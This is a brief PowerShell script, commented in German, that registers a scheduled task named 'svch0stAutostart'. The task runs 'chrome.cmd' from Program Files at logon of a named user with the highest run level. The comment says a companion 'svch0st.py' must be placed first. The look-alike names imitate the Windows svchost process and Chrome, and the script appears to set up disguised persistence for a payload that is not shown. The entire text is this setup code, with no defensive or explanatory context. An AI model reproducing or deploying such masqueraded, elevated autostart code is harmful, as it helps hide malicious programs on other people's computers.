# Bevor dieses Skript ausgeführt wird, füge chrome.cmd und svch0st.py an die richtigen Orte

$action = New-ScheduledTaskAction `
    -Execute "cmd.exe" `
    -Argument "/c `"C:\Program Files\chrome.cmd`""

$trigger = New-ScheduledTaskTrigger -AtLogOn -User "a.mueller"

Register-ScheduledTask `
    -TaskName "svch0stAutostart" `
    -Action $action `
    -Trigger $trigger `
    -User "$User" `
    -RunLevel Highest `
    -Force
